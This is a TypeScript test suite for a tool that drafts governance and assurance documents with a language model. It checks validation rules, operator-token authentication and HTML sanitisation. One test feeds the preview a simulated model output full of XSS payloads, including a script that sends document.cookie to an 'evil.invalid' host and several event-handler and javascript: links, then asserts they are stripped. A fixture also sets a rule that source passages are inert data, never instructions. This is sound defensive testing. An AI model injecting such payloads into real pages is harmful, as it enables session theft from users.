  it('D-06, D-07 & T-02: catches Golden wording contamination, enforces required vs profile-optional sections, and reports incompatible/broken tactic links', async () => {
    const { workspace, profile, mockFetch } = await createSaeSandboxWithSources();

    // 1. D-06 + D-07 (missing required section) + T-02 (incompatible tactic link + prohibited activation claim):
    const runtime = await resolveProfileInputSet({ workspaceRoot: workspace, profile });
    const plan = createDocumentPlan(runtime, { mode: 'pair', pair_ids: ['PAIR-A2'] });
    const sourceBundle = await prepareSourcesForPlan({
      workspaceRoot: workspace,
      runtime,
      plan,
      enableUrlAcquisition: true,
      fetchPort: mockFetch
    });

    const goldenCapJson = JSON.parse(runtime.pinned.text('golden-capability')) as {
      canonical_definition: string;
    };

    const defectiveDraft = buildValidPairA2ModelOutput({ sourceBundle });
    // D-07: omit required section EVI on capability
    delete defectiveDraft.capability.sections.EVI;
    // D-06: paste Golden A1 canonical_definition and Golden handle EVD-A1-001 into A2
    defectiveDraft.capability.sections.DEF!.prose = `${goldenCapJson.canonical_definition} Requires EVD-A1-001 and GOV-PUR-001.`;
    // T-02: link AP-only tactic TAC-PURPOSE-AP-A2-01 onto capability A2, and claim tactic completion closes findings
    defectiveDraft.capability.tactic_refs = [
      {
        tactic_id: 'TAC-PURPOSE-AP-A2-01',
        scope_and_boundary_note: 'Completing this tactic automatically closes the locked finding.'
      }
    ];
    defectiveDraft.antipattern.tactic_refs = [
      {
        tactic_id: 'TAC-PURPOSE-AP-A2-01',
        scope_and_boundary_note:
          'Completing this tactic automatically closes the finding and clears the hard gate.'
      }
    ];

    const { port } = makeMockProviderPort(() => defectiveDraft);
    const defectiveResult = await authorPairWorkUnit({
      runtime,
      plan,
      sourceBundle,
      pairId: 'PAIR-A2',
      providerPort: port
    });

    expect(defectiveResult.validation.draft_valid).toBe(false);
    expect(defectiveResult.validation.capability.findings.map((f) => f.code)).toEqual(
      expect.arrayContaining([
        'REQUIRED_SECTION_MISSING',
        'GOLDEN_CONTAMINATION_DETECTED',
        'INCOMPATIBLE_TACTIC_TARGET_LINK'
      ])
    );
    expect(defectiveResult.validation.antipattern.findings.map((f) => f.code)).toContain(
      'PROHIBITED_TACTIC_ACTIVATION_CLAIM'
    );

    // Also verify T-02 broken playbook target/question detection in validateCreatorDocumentAgainstContext.
    const mutatedRuntime = {
      ...runtime,
      tactics: runtime.tactics.map((t) =>
        t.tactic_id === 'TAC-PURPOSE-A2-01'
          ? {
              ...t,
              reassessment_targets: ['NONEXISTENT-OBJ-404'],
              linked_question_ids: ['B1-Q1']
            }
          : t
      )
    };
    const brokenTacCheck = validateCreatorDocumentAgainstContext({
      document: {
        ...defectiveResult.antipattern,
        tactic_associations: defectiveResult.antipattern.tactic_associations.map((t) => ({
          ...t,
          scope_and_boundary_note: 'Advisory association only; never closes findings.'
        }))
      },
      plannedDocument: plan.documents.find((d) => d.object_id === 'AP-A2')!,
      runtime: mutatedRuntime,
      plan,
      sourceBundle
    });
    expect(brokenTacCheck.findings.map((f) => f.code)).toEqual(
      expect.arrayContaining(['TACTIC_LINK_MISSING_TARGET', 'TACTIC_LINK_INCOMPATIBLE_QUESTION'])
    );

    // 2. D-07 positive: Profile omits optional LIF section -> explicit omission recorded and passes validation!
    const optionalLifProfile: KbProfile = {
      ...JSON.parse(JSON.stringify(profile)),
      output_spec: {
        ...profile.output_spec,
        required_sections: {
          ...profile.output_spec.required_sections,
          capability: profile.output_spec.required_sections.capability.filter(
            (s) => !s.startsWith('LIF:')
          ),
          antipattern: profile.output_spec.required_sections.antipattern.filter(
            (s) => !s.startsWith('LIF:')
          )
        }
      }
    };
    const optRuntime = await resolveProfileInputSet({
      workspaceRoot: workspace,
      profile: optionalLifProfile
    });
    const optPlan = createDocumentPlan(optRuntime, { mode: 'pair', pair_ids: ['PAIR-A2'] });
    const optBundle = await prepareSourcesForPlan({
      workspaceRoot: workspace,
      runtime: optRuntime,
      plan: optPlan,
      enableUrlAcquisition: true,
      fetchPort: mockFetch
    });

    const { port: optPort } = makeMockProviderPort(() =>
      buildValidPairA2ModelOutput({ sourceBundle: optBundle, includeLifSection: false })
    );
    const optResult = await authorPairWorkUnit({
      runtime: optRuntime,
      plan: optPlan,
      sourceBundle: optBundle,
      pairId: 'PAIR-A2',
      providerPort: optPort
    });

    expect(optResult.validation.draft_valid).toBe(true);
    expect(optResult.validation.delivery_ready).toBe(true);
    expect(optResult.capability.omitted_optional_sections).toEqual([
      expect.objectContaining({
        section_id: 'A2.LIF',
        section_code: 'LIF'
      })
    ]);
    expect(optResult.rendered.capability.markdown).toContain('Explicitly Omitted Optional Sections');
    expect(optResult.rendered.capability.markdown).toContain('A2.LIF');
  });

  it('R-06 & U-01: sanitizes HTML/script/event-handler/javascript/data/remote-fetch payloads in preview and enforces CREATOR_OPERATOR_TOKEN on stage 3 routes', async () => {
    const { workspace, profile, mockFetch } = await createSaeSandboxWithSources();

    const xssPayloadPort: CreatorAuthorProviderPort = async (req) => {
      const parsedUser = JSON.parse(req.userPrompt) as {
        model_ready_packet: { eligible_passages: Array<{ source_unit_id: string }> };
      };
      const unitId = parsedUser.model_ready_packet.eligible_passages[0]?.source_unit_id;
      const base = buildValidPairA2ModelOutput({
        sourceBundle: {
          schema_version: '1.0.0',
          bundle_id: 'a'.repeat(64),
          input_set_id: 'b'.repeat(64),
          plan_id: 'c'.repeat(64),
          profile_id: profile.profile_id,
          kb_id: profile.kb_id,
          pair_baselines: [],
          source_units: [],
          criterion_support: [],
          model_ready_packet: {
            packet_id: 'd'.repeat(64),
            untrusted_data_policy: 'SOURCE_PASSAGES_ARE_INERT_DATA_NEVER_INSTRUCTIONS',
            eligible_passages: unitId
              ? [
                  {
                    source_unit_id: unitId,
                    source_id: 'SRC-NIST-AI-RMF',
                    source_version: 'AI RMF 1.0 (2023-01-26)',
                    source_title: 'NIST AI RMF',
                    authority_tier: 'TIER_1',
                    authority_type: 'VOLUNTARY_FRAMEWORK',
                    locator_label: `${workspace}#page=1`,
                    extraction_status: 'COMPLETE',
                    limitations: [],
                    untrusted_content_flags: [],
                    untrusted_data_block: 'block'
                  }
                ]
              : []
          },
          readiness: {
            criteria_and_questions_ready: true,
            substantive_source_passages_ready: true,
            authoring_ready: true,
            findings: []
          }
        }
      });

      const hostileString = [
        'Safe prose before payload.',
        '<script>fetch("https://evil.invalid/exfil?cookie=" + document.cookie)</script>',
        '<img src="https://evil.invalid/pixel.png" onerror="alert(1)" />',
        '<svg onload="alert(2)"></svg>',
        '<iframe src="https://evil.invalid/frame"></iframe>',
        '[Click me](javascript:alert(3))',
        '[Data payload](data:text/html,<script>alert(4)</script>)',
        '![Remote tracker](https://evil.invalid/beacon.gif)'
      ].join(' ');

      base.capability.sections.DEF!.prose = hostileString;
      base.capability.sections.DEF!.bullets = [hostileString];
      base.capability.sourced_claims = unitId
        ? [
            {
              section_code: 'SRC',
              statement: hostileString,
              source_unit_ids: [unitId]
            }
          ]
        : [];
      base.antipattern.sections.DEF!.prose = hostileString;

      return {
        provider: 'OPENAI',
        model: 'mock-xss-test',
        rawText: JSON.stringify(base),
        parsedJson: base,
        latencyMs: 5,
        promptHash: sha256(req.userPrompt)
      };
    };

    const testAuthStub = 'dc03-fixture-operator-stub';

    // 1. Verify fail-closed 503 when authorProviderPort is NOT configured.
    const unconfiguredAuthorApp = await buildCreatorApp({
      workspaceRoot: workspace,
      operatorToken: testAuthStub,
      profiles: [profile]
    });
    const noPortRes = await unconfiguredAuthorApp.inject({
      method: 'POST',
      url: '/api/creator/documents/author',
      headers: { 'x-creator-token': testAuthStub },
      payload: { profileId: 'sae-local-pilot', pairId: 'PAIR-A2' }
    });
    expect(noPortRes.statusCode).toBe(503);
    expect(noPortRes.json()).toMatchObject({ error: 'AUTHOR_PROVIDER_NOT_CONFIGURED' });
    await unconfiguredAuthorApp.close();

    // 2. Verify auth enforcement (401 without token) and sanitized preview (200 with token).
    const app = await buildCreatorApp({
      workspaceRoot: workspace,
      operatorToken: testAuthStub,
      profiles: [profile],
      fetchPort: mockFetch,
      allowLiveSourceFetch: true,
      authorProviderPort: xssPayloadPort
    });

    const unauthGet = await app.inject({ method: 'GET', url: '/creator/documents' });
    expect(unauthGet.statusCode).toBe(401);

    const unauthPost = await app.inject({
      method: 'POST',
      url: '/api/creator/documents/author',
      payload: { profileId: 'sae-local-pilot', pairId: 'PAIR-A2' }
    });
    expect(unauthPost.statusCode).toBe(401);

    const headers = { 'x-creator-token': testAuthStub };
    const authorApiRes = await app.inject({
      method: 'POST',
      url: '/api/creator/documents/author',
      headers,
      payload: {
        profileId: 'sae-local-pilot',
        pairId: 'PAIR-A2',
        enableUrlAcquisition: true
      }
    });
    expect(authorApiRes.statusCode).toBe(200);

    const uiRes = await app.inject({
      method: 'GET',
      url: '/creator/documents?profileId=sae-local-pilot&pairId=PAIR-A2',
      headers
    });
    expect(uiRes.statusCode).toBe(200);
    expect(uiRes.headers['content-security-policy']).toContain("default-src 'none'");

    const htmlBody = uiRes.body;
    expect(htmlBody).toContain('3. Documents — Draft authoring &amp; sanitized preview');
    expect(htmlBody).toContain('Safe prose before payload.');

    // R-06: Zero executable tags, inline handlers, unsafe URL schemes, or remote fetch embeds in HTML!
    expect(htmlBody).not.toMatch(/<script\b/i);
    expect(htmlBody).not.toMatch(/<img\b/i);
    expect(htmlBody).not.toMatch(/<svg\b/i);
    expect(htmlBody).not.toMatch(/<iframe\b/i);
    expect(htmlBody).not.toMatch(/\bonerror\s*=/i);
    expect(htmlBody).not.toMatch(/\bonload\s*=/i);
    expect(htmlBody).not.toMatch(/javascript\s*:/i);
    expect(htmlBody).not.toMatch(/data\s*:\s*text\/html/i);
    expect(htmlBody).toContain('&lt;script&gt;');
    expect(htmlBody).toContain('[unsafe-scheme-blocked]');

    // Also verify GET /api/creator/documents and HTML form POST /creator/documents/author.
    const getApiDraftRes = await app.inject({
      method: 'GET',
      url: '/api/creator/documents?profileId=sae-local-pilot&pairId=PAIR-A2',
      headers
    });
    expect(getApiDraftRes.statusCode).toBe(200);
    expect(getApiDraftRes.json()).toMatchObject({
      draftKey: 'sae-local-pilot:PAIR-A2'
    });

    const formPostValidRes = await app.inject({
      method: 'POST',
      url: '/creator/documents/author',
      headers: {
        ...headers,
        'content-type': 'application/x-www-form-urlencoded'
      },
      payload: 'profileId=sae-local-pilot&pairId=PAIR-A2'
    });
    expect(formPostValidRes.statusCode).toBe(200);
    expect(formPostValidRes.body).toContain('solution-assurance-engine:A2');

    const formPostForeignHandlesRes = await app.inject({
      method: 'POST',
      url: '/creator/documents/author',
      headers: {
        ...headers,
        'content-type': 'application/x-www-form-urlencoded'
      },
      payload: 'profileId=sae-local-pilot&pairId=PAIR-A3'
    });
    expect(formPostForeignHandlesRes.statusCode).toBe(422);
    expect(formPostForeignHandlesRes.body).toContain('INVENTED_OR_FOREIGN_QUESTION_ID');

    await app.close();
  });

  it('I-05 reuse: authors, validates, and renders a fresh non-Golden pair in the synthetic non-A–F profile (OPS/SEC) without generic code changes', async () => {
    const synProfile = await buildProfileFromInventoryFile({
      workspaceRoot: process.cwd(),
      inventoryPath: 'tests/fixtures/synthetic-profile/input-inventory.json',
      profileId: 'synthetic-operational-resilience',
      profileVersion: '0.1.0',
      kbId: 'synthetic-resilience-kb',
      kbTitle: 'Synthetic Operational Resilience KB (Test Fixture Only)',
      outputRoot: 'tests/fixtures/synthetic-profile/output',
      isSynthetic: true,
      allowedInputRoots: ['tests/fixtures/synthetic-profile'],
      referencesSubdir: 'tests/fixtures/synthetic-profile/inputs'
    });
    synProfile.domain_folder_tokens = { OPS: 'operations-continuity', SEC: 'security-mesh' };

    const synRuntime = await resolveProfileInputSet({
      workspaceRoot: process.cwd(),
      profile: synProfile
    });
    const synPlan = createDocumentPlan(synRuntime, {
      mode: 'pair',
      pair_ids: ['SYN-PAIR-OPS-2']
    });

    const synFetch: HttpFetchPort = async (url) => {
      if (url.includes('example.org/synthetic/ops-guide')) {
        return mockHtmlResponse(
          200,
          '<html><body><h2>Section 2 — Failover Drills</h2><p>Synthetic drill guidance requires executed failover exercises with recorded recovery times.</p></body></html>'
        );
      }
      return mockHtmlResponse(404, 'Not found');
    };

    const synBundle = await prepareSourcesForPlan({
      workspaceRoot: process.cwd(),
      runtime: synRuntime,
      plan: synPlan,
      enableUrlAcquisition: true,
      fetchPort: synFetch
    });
    expect(synBundle.readiness.substantive_source_passages_ready).toBe(true);
    const synPassage = synBundle.model_ready_packet.eligible_passages[0]!;

    const synDraft: PairAuthorModelOutput = {
      capability: {
        sections: {
          DEF: { prose: 'Synthetic OPS-2 requires recurring failover drills against documented RTO targets.' },
          APP: { prose: 'Applies to synthetic stateful workloads in domain OPS.' },
          CRI: { prose: 'Evaluates OPS-2-D1 and OPS-2-D2.', question_ids: ['OPS-2-D1', 'OPS-2-D2'] },
          EVI: { prose: 'Requires executed drill logs rather than unverified runbooks.' },
          INT: { prose: 'Missing drill timestamps keep OPS-2 UNKNOWN.' },
          LIF: { prose: 'Drills are verified prior to cutover and during operation.' },
          REL: { prose: 'Paired with AP-OPS-2 and related to SEC-1.' },
          TAC: { prose: 'Associated synthetic tactics remain advisory only.' },
          SRC: { prose: 'Grounded in synthetic operational runbook guide.', source_unit_ids: [synPassage.source_unit_id] },
          REV: { prose: 'Synthetic test fixture draft.' }
        },
        assessment_boundaries: {
          unknown_handling: ['Missing failover drill records keep OPS-2 UNKNOWN without implying AP-OPS-2 presence.'],
          contradiction_handling: ['Conflicting drill timestamps remain UNKNOWN until reviewed.'],
          false_positive_guards: ['Tabletop walkthrough slides alone do not prove executed failover.'],
          prohibited_inferences: ['Do not infer AP-OPS-2 presence from an OPS-2 gap.'],
          human_decision_boundaries: ['Synthetic resilience owner adjudicates recovery exceptions.'],
          evidence_ceilings: ['Runbook text caps assurance at DECLARED.'],
          paired_independence_rule: 'OPS-2 gaps do not automatically establish AP-OPS-2 presence.'
        },
        sourced_claims: [
          {
            section_code: 'SRC',
            statement: 'Synthetic failover readiness requires executed exercises with recorded recovery metrics.',
            source_unit_ids: [synPassage.source_unit_id]
          }
        ],
        related_object_links: [
          { target_object_id: 'AP-OPS-2', non_inverse_meaning: 'Independent paired anti-pattern.' },
          { target_object_id: 'SEC-1', non_inverse_meaning: 'Cross-domain credential boundary.' }
        ]
      },
      antipattern: {
        sections: {
          DEF: { prose: 'Synthetic AP-OPS-2 captures paper-only failover plans never exercised against live dependencies.' },
          IND: { prose: 'Outdated runbook steps and unverified recovery scripts.' },
          CRI: { prose: 'Tests AP-OPS-2-D1 and AP-OPS-2-D2.', question_ids: ['AP-OPS-2-D1', 'AP-OPS-2-D2'] },
          ABS: { prose: 'TESTED_ABSENT requires an executed failover verification package; missing evidence stays UNKNOWN.' },
          CON: { prose: 'Silence or zero outages never proves AP-OPS-2 absence.' },
          REL: { prose: 'Paired with OPS-2 without inverse inference.' },
          LIF: { prose: 'Re-verify after topology changes.' },
          TAC: { prose: 'Advisory synthetic tactics only.' },
          SRC: { prose: 'Grounded in synthetic runbook guide.', source_unit_ids: [synPassage.source_unit_id] },
          REV: { prose: 'Synthetic anti-pattern draft.' }
        },
        assessment_boundaries: {
          unknown_handling: ['Missing anti-pattern evidence keeps AP-OPS-2 UNKNOWN even when OPS-2 is NOT_SATISFIED.'],
          contradiction_handling: ['Preserve discrepancies between runbooks and actual topology.'],
          false_positive_guards: ['Scheduled deferral with constrained scope is not paper-only theatre.'],
          prohibited_inferences: ['Silence or zero outages never establishes anti-pattern absence.'],
          human_decision_boundaries: ['Human operator locks synthetic findings.'],
          evidence_ceilings: ['TESTED_ABSENT requires executed drill verification.'],
          paired_independence_rule: 'OPS-2 NOT_SATISFIED does not establish AP-OPS-2 presence.',
          failure_mechanism: 'Unexercised paper runbooks conceal broken recovery paths until an outage occurs.',
          observable_indicators: ['No executed drill log', 'Stale dependency endpoints in runbook'],
          non_examples: ['Recently executed staged failover with documented residual gaps'],
          tested_absence_requirements: ['Current executed failover test covering primary and secondary dependencies.']
        },
        sourced_claims: [
          {
            section_code: 'SRC',
            statement: 'Failover assurance depends on recorded exercise outcomes rather than static documentation.',
            source_unit_ids: [synPassage.source_unit_id]
          }
        ]
      }
    };

    const { port } = makeMockProviderPort(() => synDraft);
    const synResult = await authorPairWorkUnit({
      runtime: synRuntime,
      plan: synPlan,
      sourceBundle: synBundle,
      pairId: 'SYN-PAIR-OPS-2',
      providerPort: port
    });

    expect(synResult.validation.draft_valid).toBe(true);
    expect(synResult.validation.delivery_ready).toBe(true);
    expect(synResult.capability.document_id).toBe('synthetic-resilience-kb:OPS-2');
    expect(synResult.capability.destination_path_template).toBe(
      'operations-continuity/capabilities/OPS-2/{version}/document.md'
    );
    expect(synResult.capability.sections[0]?.section_id).toBe('OPS-2.DEF');
    expect(synResult.antipattern.sections[0]?.section_id).toBe('AP-OPS-2.DEF');
    expect(synResult.capability.tactic_associations.map((t) => t.tactic_id)).toEqual([
      'SYN-TAC-OPS-01',
      'SYN-TAC-CROSS-01'
    ]);
    expect(synResult.rendered.capability.markdown).toContain(
      'SYNTHETIC TEST PROFILE — NOT APPROVED DOMAIN KNOWLEDGE'
    );
    expect(synResult.rendered.standalone_html_preview).toContain(
      'SYNTHETIC TEST PROFILE — NOT APPROVED DOMAIN KNOWLEDGE'
    );

    // Also exercise domain SEC (SYN-PAIR-SEC-1, whose register source SYN-SRC-SEC-01 is metadata-only).
    const secPlan = createDocumentPlan(synRuntime, {
      mode: 'pair',
      pair_ids: ['SYN-PAIR-SEC-1']
    });
    const secBundle = await prepareSourcesForPlan({
      workspaceRoot: process.cwd(),
      runtime: synRuntime,
      plan: secPlan,
      enableUrlAcquisition: false
    });
    const secDraft: PairAuthorModelOutput = {
      capability: {
        sections: {
          DEF: { prose: 'Synthetic SEC-1 isolates workload service tokens per trust boundary.' },
          APP: { prose: 'Applies to synthetic mesh services in SEC.' },
          CRI: { prose: 'Evaluates SEC-1-D1 and SEC-1-D2.', question_ids: ['SEC-1-D1', 'SEC-1-D2'] },
          EVI: { prose: 'Requires scoped token policy and rotation logs.' },
          INT: { prose: 'Missing token audit evidence keeps SEC-1 UNKNOWN.' },
          LIF: { prose: 'Verified at mesh onboarding and rotation.' },
          REL: { prose: 'Paired with AP-SEC-1.' },
          TAC: { prose: 'Advisory cross-domain credential rotation tactic.' },
          SRC: { prose: 'SYN-SRC-SEC-01 is metadata-only; external claims remain UNRESOLVED.' },
          REV: { prose: 'Synthetic SEC-1 draft.' }
        },
        assessment_boundaries: {
          unknown_handling: ['Missing token logs keep SEC-1 UNKNOWN without implying AP-SEC-1 presence.'],
          contradiction_handling: ['Conflicting mesh policies keep SEC-1 UNKNOWN.'],
          false_positive_guards: ['Static config templates do not prove runtime isolation.'],
          prohibited_inferences: ['Do not infer AP-SEC-1 presence from SEC-1 gaps.'],
          human_decision_boundaries: ['Synthetic security owner locks findings.'],
          evidence_ceilings: ['Config files alone cap assurance at IMPLEMENTED.'],
          paired_independence_rule: 'SEC-1 gaps do not establish AP-SEC-1 presence.'
        },
        sourced_claims: [
          {
            section_code: 'SRC',
            statement: 'Mesh boundary credential isolation claim awaiting readable source passage.',
            source_unit_ids: [],
            unresolved_reason: 'SYN-SRC-SEC-01 is metadata-and-locator-only.'
          }
        ]
      },
      antipattern: {
        sections: {
          DEF: { prose: 'Synthetic AP-SEC-1 captures shared ambient credentials across trust zones.' },
          IND: { prose: 'Wildcard tokens reused across multiple workloads.' },
          CRI: { prose: 'Tests AP-SEC-1-D1 and AP-SEC-1-D2.', question_ids: ['AP-SEC-1-D1', 'AP-SEC-1-D2'] },
          ABS: { prose: 'TESTED_ABSENT requires executed token-isolation tests; missing evidence stays UNKNOWN.' },
          CON: { prose: 'Zero reported breaches never proves AP-SEC-1 absence.' },
          REL: { prose: 'Paired with SEC-1 under non-inverse rules.' },
          LIF: { prose: 'Repeat absence checks when mesh routes change.' },
          TAC: { prose: 'No direct AP-SEC-1 tactics declared.' },
          SRC: { prose: 'Metadata-only source leaves external claims UNRESOLVED.' },
          REV: { prose: 'Synthetic AP-SEC-1 draft.' }
        },
        assessment_boundaries: {
          unknown_handling: ['Missing anti-pattern evidence keeps AP-SEC-1 UNKNOWN even when SEC-1 is NOT_SATISFIED.'],
          contradiction_handling: ['Preserve conflicting IAM and runtime records.'],
          false_positive_guards: ['Scoped short-lived bootstrap token is not ambient credential sharing.'],
          prohibited_inferences: ['Silence or zero reported breaches never proves AP-SEC-1 absence.'],
          human_decision_boundaries: ['Human security lead locks AP-SEC-1 findings.'],
          evidence_ceilings: ['TESTED_ABSENT requires current scoped credential-boundary testing.'],
          paired_independence_rule: 'SEC-1 NOT_SATISFIED does not establish AP-SEC-1 presence.',
          failure_mechanism: 'Shared ambient tokens allow lateral compromise across mesh boundaries.',
          observable_indicators: ['Shared static secret across distinct services'],
          non_examples: ['Per-service workload identity with automated rotation'],
          tested_absence_requirements: ['Executed runtime credential inspection across all SEC-1 trust zones.']
        }
      }
    };
    const { port: secPort } = makeMockProviderPort(() => secDraft);
    const secResult = await authorPairWorkUnit({
      runtime: synRuntime,
      plan: secPlan,
      sourceBundle: secBundle,
      pairId: 'SYN-PAIR-SEC-1',
      providerPort: secPort
    });
    expect(secResult.validation.draft_valid).toBe(true);
    expect(secResult.validation.delivery_ready).toBe(false);
    expect(secResult.capability.destination_path_template).toBe(
      'security-mesh/capabilities/SEC-1/{version}/document.md'
    );
    expect(secResult.capability.sections[0]?.section_id).toBe('SEC-1.DEF');
    expect(secResult.antipattern.tactic_associations).toEqual([]);

    // Verify synthetic fixture output folder also remains clean.
    const synOutEntries = await readdir('tests/fixtures/synthetic-profile/output');
    expect(synOutEntries).toEqual(['.gitkeep']);
  });

  it('SAE-training alignment: preserves NIST 10.6028 DOI redirects, register applicability conditions, TIER_1_NORMATIVE Charter rights authority, instrument humanAuthority/state vocabularies, sibling-pair boundaries, and SOURCE_FIELDS_ONLY tactic metadata', async () => {
    const profile = await buildSaeLocalPilotProfile(process.cwd());
    expect(profile.source_policy.allowed_publication_hosts).toEqual(
      expect.arrayContaining(['doi.org', 'nvlpubs.nist.gov', 'csrc.nist.gov'])
    );

    const runtime = await resolveProfileInputSet({ workspaceRoot: process.cwd(), profile });

    // Canonical SAE state vocabularies + operating-boundary rule extracted from pinned SAE inputs.
    expect(runtime.inputSet.cognitive_model?.state_vocabularies).toMatchObject({
      capability_conclusions: [
        'SATISFIED',
        'PARTIALLY_SATISFIED',
        'NOT_SATISFIED',
        'UNKNOWN',
        'NOT_APPLICABLE'
      ],
      antipattern_conclusions: [
        'CONFIRMED_PRESENT',
        'PARTIALLY_PRESENT',
        'TESTED_ABSENT',
        'UNKNOWN',
        'NOT_APPLICABLE'
      ],
      technical_assurance: [
        'UNKNOWN',
        'DECLARED',
        'IMPLEMENTED',
        'TESTED',
        'OPERATIONALLY_OBSERVED',
        'NOT_APPLICABLE'
      ]
    });
    expect(
      runtime.inputSet.cognitive_model?.state_vocabularies?.boundary_notes.join(' ')
    ).toContain('ISOLATED_SANDBOX');

    // Instrument per-object metadata preserved across domains (A2 GOVERNANCE, A4 LEGAL, B3 PERSONAL_DATA + PRIVACY).
    const pairA2 = runtime.pairs.find((p) => p.pair_id === 'PAIR-A2');
    const pairA4 = runtime.pairs.find((p) => p.pair_id === 'PAIR-A4');
    const pairB3 = runtime.pairs.find((p) => p.pair_id === 'PAIR-B3');
    expect(pairA2?.instrument_metadata).toMatchObject({
      capability_applicability: 'ALWAYS',
      capability_human_authority: 'GOVERNANCE',
      antipattern_signals: ['value-theatre']
    });
    expect(pairA4?.instrument_metadata?.capability_human_authority).toBe('LEGAL');
    expect(pairB3?.instrument_metadata).toMatchObject({
      capability_applicability: 'PERSONAL_DATA',
      capability_human_authority: 'PRIVACY'
    });

    // Playbook SOURCE_FIELDS_ONLY metadata preserved without inventing absent fields.
    const tacA201 = runtime.tactics.find((t) => t.tactic_id === 'TAC-PURPOSE-A2-01');
    expect(tacA201).toMatchObject({
      function_label: 'Value foundation',
      operationalization_status: 'SOURCE_FIELDS_ONLY',
      reassessment_targets: ['A2', 'AP-A2']
    });
    expect(tacA201?.principal_outputs).toContain('value hypothesis');

    // Simulate DOI 302 redirect (doi.org -> nvlpubs.nist.gov) + SRC-EU-CHARTER (TIER_1_NORMATIVE / PRIMARY_RIGHTS_SOURCE).
    const doiRedirectFetch: HttpFetchPort = async (url) => {
      if (url === 'https://doi.org/10.6028/NIST.AI.100-1') {
        return mockHtmlResponse(302, '', {
          location: 'https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-1.html'
        });
      }
      if (url === 'https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-1.html') {
        return mockHtmlResponse(
          200,
          '<html><body><h2>MAP 1.1 — Intended Purpose and Value</h2><p>NIST AI RMF context and proportionality mapping.</p></body></html>'
        );
      }
      if (url.includes('CELEX:12012P/TXT')) {
        return mockHtmlResponse(
          200,
          '<html><body><h2>Article 52 — Scope and interpretation of rights</h2><p>Proportionality of limitations on rights and freedoms.</p></body></html>'
        );
      }
      return mockHtmlResponse(404, 'Not found');
    };

    const plan = createDocumentPlan(runtime, { mode: 'pair', pair_ids: ['PAIR-A2'] });
    const bundle = await prepareSourcesForPlan({
      workspaceRoot: process.cwd(),
      runtime,
      plan,
      enableUrlAcquisition: true,
      allowPublisherTermsModelEgress: true,
      fetchPort: doiRedirectFetch,
      resolveAddresses: async () => ['93.184.216.34']
    });

    const nistPassage = bundle.model_ready_packet.eligible_passages.find(
      (p) => p.source_id === 'SRC-NIST-AI-RMF'
    );
    const charterPassage = bundle.model_ready_packet.eligible_passages.find(
      (p) => p.source_id === 'SRC-EU-CHARTER'
    );
    expect(nistPassage?.locator_label).toContain('nvlpubs.nist.gov');
    expect(nistPassage?.roles_or_applicability_conditions?.join(' ')).toContain(
      'Voluntary risk-management guidance'
    );
    expect(charterPassage?.roles_or_applicability_conditions?.join(' ')).toContain(
      'Article 51 scope'
    );

    const prompts = buildPairAuthorPrompts({
      runtime,
      workUnit: plan.work_units[0]!,
      capabilityDoc: plan.documents[0]!,
      antipatternDoc: plan.documents[1]!,
      pairBaseline: bundle.pair_baselines[0]!,
      sourceBundle: bundle
    });
    const promptPayload = JSON.parse(prompts.userPrompt) as {
      domain_sibling_pairs: Array<{ pair_id: string }>;
      instrument_metadata: { capability_human_authority: string };
      state_vocabularies: { capability_conclusions: string[] };
    };
    expect(promptPayload.domain_sibling_pairs.map((p) => p.pair_id)).toEqual([
      'PAIR-A1',
      'PAIR-A3',
      'PAIR-A4',
      'PAIR-A5'
    ]);
    expect(promptPayload.instrument_metadata.capability_human_authority).toBe('GOVERNANCE');
    expect(promptPayload.state_vocabularies.capability_conclusions).toContain('PARTIALLY_SATISFIED');

    // Verify SRC-EU-CHARTER (TIER_1_NORMATIVE / PRIMARY_RIGHTS_SOURCE) classifies as BINDING_LEGISLATION_WHEN_APPLICABLE
    // and renders applicability conditions in bibliography.
    const draft = buildValidPairA2ModelOutput({ sourceBundle: bundle });
    draft.capability.sourced_claims = [
      {
        section_code: 'SRC',
        statement: 'Proportionality analysis under EU Charter Article 52 when Union law applies.',
        source_unit_ids: [charterPassage!.source_unit_id]
      }
    ];
    const { port } = makeMockProviderPort(() => draft);
    const authored = await authorPairWorkUnit({
      runtime,
      plan,
      sourceBundle: bundle,
      pairId: 'PAIR-A2',
      providerPort: port
    });

    expect(authored.validation.draft_valid).toBe(true);
    expect(authored.capability.sourced_claims[0]?.authority_distinction).toBe(
      'BINDING_LEGISLATION_WHEN_APPLICABLE'
    );
    expect(authored.rendered.capability.markdown).toContain('Apply Article 51 scope');
  });
});
